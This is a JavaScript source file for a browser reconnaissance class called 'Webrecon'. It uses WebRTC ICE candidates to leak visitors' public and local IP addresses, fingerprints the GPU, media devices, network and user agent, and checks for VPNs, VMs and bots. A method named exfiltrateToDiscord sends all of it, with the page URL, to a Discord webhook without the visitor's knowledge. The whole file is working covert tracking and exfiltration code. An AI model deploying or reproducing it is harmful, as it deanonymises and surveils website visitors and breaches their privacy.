class Webrecon {
    constructor(config = {}) {
        this.stunServers = config.stunServers || [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302'
        ];
        
        // Allow passing the webhook URL directly into the config
        this.webhookUrl = config.webhookUrl || null;

        this.candidates = [];
        this.publicIPs = new Set();
        this.localInterfaces = new Set();
        this.isComplete = false;
    }

    _parseCandidate(candidateStr) {
        const parts = candidateStr.split(' ');
        if (parts.length < 8) return null;

        const candidate = {
            foundation: parts[0].split(':')[1],
            component: parts[1],
            protocol: parts[2].toLowerCase(),
            priority: parseInt(parts[3], 10),
            ip: parts[4],
            port: parseInt(parts[5], 10),
            type: parts[7] 
        };

        const raddrIndex = parts.indexOf('raddr');
        if (raddrIndex !== -1) candidate.relatedAddress = parts[raddrIndex + 1];

        return candidate;
    }

    async harvest() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: this.stunServers }],
                iceTransportPolicy: 'all' 
            });

            pc.createDataChannel('webrtk-channel');

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const parsed = this._parseCandidate(event.candidate.candidate);
                    if (parsed) {
                        this.candidates.push(parsed);

                        if (parsed.type === 'srflx') {
                            this.publicIPs.add(parsed.ip);
                        } else if (parsed.type === 'host') {
                            this.localInterfaces.add(parsed.ip);
                        }
                    }
                } else {
                    this.isComplete = true;
                    pc.close();
                    resolve(this.getFingerprint());
                }
            };

            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(err => console.error("Recon Error: ", err));

            setTimeout(() => {
                if (!this.isComplete) {
                    this.isComplete = true;
                    pc.close();
                    resolve(this.getFingerprint());
                }
            }, 3000); 
        });
    }

    getFingerprint() {
        const vpnLikely = this.publicIPs.size > 1; 
        const localInterfaceCount = this.localInterfaces.size;

        return {
            timestamp: new Date().toISOString(),
            network: {
                publicIPs: Array.from(this.publicIPs),
                mDNSHosts: Array.from(this.localInterfaces),
                interfaceCount: localInterfaceCount,
                vpnSuspicion: vpnLikely
            },
            rawCandidates: this.candidates
        };
    }

    /**
     * Harvests the data, formats it for Discord, and sends it to the configured Webhook.
     */
    async exfiltrateToDiscord() {
        if (!this.webhookUrl) {
            console.error("WEBRecon: No Webhook URL configured.");
            return false;
        }

        // Run data gathering concurrently where possible
        const [data, netEnv, mediaInfo] = await Promise.all([
            this.harvest(),
            this.getNetworkEnvironment(),
            this.getMediaDevices()
        ]);
        
        const evalResult = this.evaluateConnection(data.rawCandidates);
        const hardwareAnalysis = this.analyzeHardwareInterfaces();
        const botAnalysis = this.detectAutomation(); // <-- NEW: Call the automation check
        const fingerprint = this.getFingerprint();
        const mainIp = Array.from(this.publicIPs)[0];
        
        const gpuData = this.getGPUFingerprint();
        let gpuStatus = `**Vendor:** ${gpuData.vendor}\n**Renderer:** ${gpuData.renderer}`;
        if (gpuData.isVM) {
            gpuStatus += `\n⚠️ **VM/HEADLESS DETECTED** (Software Renderer)`;
            evalResult.score += 4; // Bump complexity/suspicion score
        }
        
        // Format media string
        let mediaStats = "Unavailable";
        let mediaLabels = "None/No Permissions";
        
        if (!mediaInfo.error) {
            mediaStats = `Mics: ${mediaInfo.audioInput} | Speakers: ${mediaInfo.audioOutput} | Cams: ${mediaInfo.videoInput}`;
            if (mediaInfo.labels.length > 0) {
                mediaLabels = mediaInfo.labels.join('\n');
            }
        }
        
        let tunnelInfo = "N/A";
        if (mainIp) {
            const analysis = await this.analyzeVpnTunnel(mainIp);
            if (analysis) {
                tunnelInfo = analysis.isMismatched 
                    ? `🚩 **MISMATCH DETECTED**\n**System:** ${analysis.systemTimezone}\n**IP Geo:** ${analysis.ipTimezone}`
                    : `✅ **Matching** (${analysis.systemTimezone})`;
                
                if (analysis.isProxyOrHosting) {
                    tunnelInfo += `\n⚠️ **ISP Type:** Proxy/DataCenter detected`;
                }
            }
        }
        
        const payload = {
            embeds: [{
                title: "Sophisticated Connection Analysis",
                color: evalResult.score > 4 || botAnalysis.isBot ? 15158332 : 3066993, // Red if complex, suspicious, or bot
                fields: [
                    { name: "Complexity Score", value: `${evalResult.score}/10`, inline: true },
                    { name: "Detected Type", value: evalResult.details.type, inline: true },
                    // <-- NEW: Add the Bot Detection Field
                    { name: "Automated Bot?", value: botAnalysis.isBot ? `🤖 **YES**\n${botAnalysis.details}` : "👤 **NO**", inline: true }, 
                    { name: "Multiple NICs", value: evalResult.details.hasMultipleNICs ? "Yes" : " No", inline: true },
                    { name: "Network Speed", value: `${netEnv.downlink} Mbps (RTT: ${netEnv.rtt}ms)`, inline: false },
                    { name: "GPU Fingerprint", value: gpuStatus, inline: false },
                    { name: "Hardware Devices", value: mediaStats, inline: false },
                    { name: "Device Labels", value: mediaLabels, inline: false },
                    { name: "Public IPs", value: data.network.publicIPs.join('\n') || "None", inline: true },
                    { name: "Local IPs", value: data.network.mDNSHosts.join('\n') || "None", inline: true }, 
                    { name: "User Agent", value: navigator.userAgent.substring(0, 1024), inline: false }, 
                    { name: "Hardware/Adapter Fingerprint", value: hardwareAnalysis.profiles.map(p => `• **${p.hardwareGuess}** (Pref: ${p.localPreference})`).join('\n') || "None detected", inline: false },
                    { name: "VPN / Proxy Tunnel", value: tunnelInfo, inline: true }
                ],
                footer: { text: `Captured at: ${data.timestamp} | URL: ${window.location.href}` }, 
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const response = await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            return response.ok;
        } catch (err) {
            console.error("WEBRecon Transmission Error: ", err);
            return false;
        }
    }
    evaluateConnection(candidates) {
        let complexityScore = 0;
        let connectionDetails = {
            type: "Unknown",
            hasMultipleNICs: false,
            potentialEthernet: false,
            virtualized: false
        };

        const hostCandidates = candidates.filter(c => c.type === 'host');
        
        // 1. Detect Multiple Interfaces
        if (hostCandidates.length > 1) {
            connectionDetails.hasMultipleNICs = true;
            complexityScore += 2;
        }

        // 2. Ethernet Inference via Priority
        // In Chrome, Ethernet host candidates often have a priority > 20000
        const highPriority = hostCandidates.some(c => c.priority > 20000);
        if (highPriority) {
            connectionDetails.potentialEthernet = true;
            connectionDetails.type = "Wired/High-Speed";
            complexityScore += 3;
        }

        // 3. Detect Virtualization (Common in Research/Security envs)
        // Checking for common VM bridge IP patterns
        const vmPatterns = ['192.168.56.', '192.168.99.', '172.17.0.'];
        const isVM = hostCandidates.some(c => vmPatterns.some(p => c.ip.startsWith(p)));
        if (isVM) {
            connectionDetails.virtualized = true;
            complexityScore += 5;
        }

        return { score: complexityScore, details: connectionDetails };
    }

    async getNetworkEnvironment() {
        const netInfo = navigator.connection || {};
        return {
            downlink: netInfo.downlink, // Mbps
            effectiveType: netInfo.effectiveType, // 4g, 3g, etc.
            saveData: netInfo.saveData,
            rtt: netInfo.rtt // Round Trip Time
        };
    }
    async getMediaDevices() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return { error: "Media API not supported" };
            }

            const devices = await navigator.mediaDevices.enumerateDevices();
            const summary = {
                audioInput: 0,
                audioOutput: 0,
                videoInput: 0,
                labels: []
            };

            devices.forEach(device => {
                if (device.kind === 'audioinput') summary.audioInput++;
                if (device.kind === 'audiooutput') summary.audioOutput++;
                if (device.kind === 'videoinput') summary.videoInput++;
                
                // Labels are only populated if the user has granted media permissions
                if (device.label) {
                    summary.labels.push(device.label);
                }
            });

            return summary;
        } catch (err) {
            console.error("WEBRecon Media Error: ", err);
            return { error: "Enumeration failed" };
        }
    }
    /**
     * Reverse-engineers the ICE Priority integer to extract the OS-level local preference.
     */
    _extractLocalPreference(priority) {
        // Shift right by 8 bits to remove the component ID, 
        // then mask with 0xFFFF to isolate the 16-bit local preference.
        return (priority >> 8) & 0xFFFF;
    }

    /**
     * Analyzes all host candidates to fingerprint the physical hardware interfaces.
     */
    analyzeHardwareInterfaces() {
        const hostCandidates = this.candidates.filter(c => c.type === 'host');
        const hardwareProfiles = [];
        let hasPhysicalWired = false;
        let hasVirtualOrVPN = false;

        hostCandidates.forEach(cand => {
            const localPref = this._extractLocalPreference(cand.priority);
            let inferredType = "Unknown Interface";

            // Common libwebrtc / Chromium local preference mappings
            if (localPref === 65535) {
                inferredType = "Physical Ethernet (Wired)";
                hasPhysicalWired = true;
            } else if (localPref >= 30000 && localPref < 65535) {
                // Usually around 32768 or 30000 for standard Wi-Fi adapters
                inferredType = "Wi-Fi (Wireless)";
            } else if (localPref > 0 && localPref < 30000) {
                // Lower preferences are aggressively assigned to virtual bridges, VPNs, or cellular
                inferredType = "Virtual Interface / VPN Tunnel / Bridge";
                hasVirtualOrVPN = true;
            }

            hardwareProfiles.push({
                identifier: cand.ip, // This might be mDNS (e.g., 'f8a2...local') or raw IP
                rawPriority: cand.priority,
                localPreference: localPref,
                hardwareGuess: inferredType
            });
        });

        return {
            profiles: hardwareProfiles,
            summary: {
                usesWiredConnection: hasPhysicalWired,
                usesVirtualAdapters: hasVirtualOrVPN,
                totalInterfaces: hostCandidates.length
            }
        };
    }
    /**
     * Compares the system timezone with the IP-based geolocation timezone.
     */
    async analyzeVpnTunnel(ip) {
        try {
            // 1. Get local system timezone
            const systemTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // 2. Fetch geolocation data for the gathered Public IP
            const response = await fetch(`http://ip-api.com/json/${ip}?fields=timezone,proxy,hosting`);
            const geoData = await response.json();

            if (geoData.status !== 'success') return null;

            const ipTimezone = geoData.timezone;
            const isMismatched = systemTimezone !== ipTimezone;

            return {
                systemTimezone,
                ipTimezone,
                isMismatched,
                isProxyOrHosting: geoData.proxy || geoData.hosting, // Additional signals from the ISP data
                confidence: isMismatched ? "High (Timezone Mismatch)" : "Low"
            };
        } catch (err) {
            console.error("Tunnel analysis failed:", err);
            return null;
        }
    }
    /**
     * Checks for common automation frameworks (Puppeteer, Selenium, Playwright)
     * by inspecting navigator properties and headless browser characteristics.
     */
    detectAutomation() {
        let isAutomated = false;
        const reasons = [];

        // 1. Standard WebDriver flag (Standard for Puppeteer/Selenium)
        if (navigator.webdriver) {
            isAutomated = true;
            reasons.push("navigator.webdriver is true");
        }

        // 2. Headless Chrome specific anomalies
        const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
        if (isChrome) {
            // Headless Chrome often lacks the window.chrome object
            if (typeof window.chrome === "undefined") {
                isAutomated = true;
                reasons.push("Missing window.chrome");
            }
            
            // Standard desktop Chrome has default plugins (e.g., PDF Viewer). Headless often has 0.
            if (navigator.plugins.length === 0) {
                isAutomated = true;
                reasons.push("0 navigator.plugins");
            }
        }

        // 3. Check for older automation tools (e.g., PhantomJS)
        if (window.callPhantom || window._phantom) {
            isAutomated = true;
            reasons.push("PhantomJS variables found");
        }

        return {
            isBot: isAutomated,
            details: reasons.length > 0 ? reasons.join(" | ") : "Clean"
        };
    }
    /**
     * Queries the WebGL context for the unmasked GPU vendor and renderer.
     * Flags common software renderers used in VMs and headless browsers.
     */
    getGPUFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) {
                return { 
                    vendor: "N/A", 
                    renderer: "WebGL Not Supported", 
                    isVM: false 
                };
            }

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) {
                return { 
                    vendor: "Masked/Protected", 
                    renderer: "Extension Blocked (Anti-Fingerprinting active)", 
                    isVM: false 
                };
            }

            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

            // Common software renderers used in VMs, Emulators, and Headless setups
            const vmKeywords = ['swiftshader', 'llvmpipe', 'qemu', 'vmware', 'virtualbox', 'mali-450 mp']; // Mali is often emulated in Android VMs
            const rendererLower = renderer.toLowerCase();
            const isVM = vmKeywords.some(keyword => rendererLower.includes(keyword));

            return {
                vendor: vendor,
                renderer: renderer,
                isVM: isVM
            };

        } catch (err) {
            console.error("WEBRecon GPU Error: ", err);
            return { 
                vendor: "Error", 
                renderer: "Failed to extract", 
                isVM: false 
            };
        }
    }
}

export default Webrecon;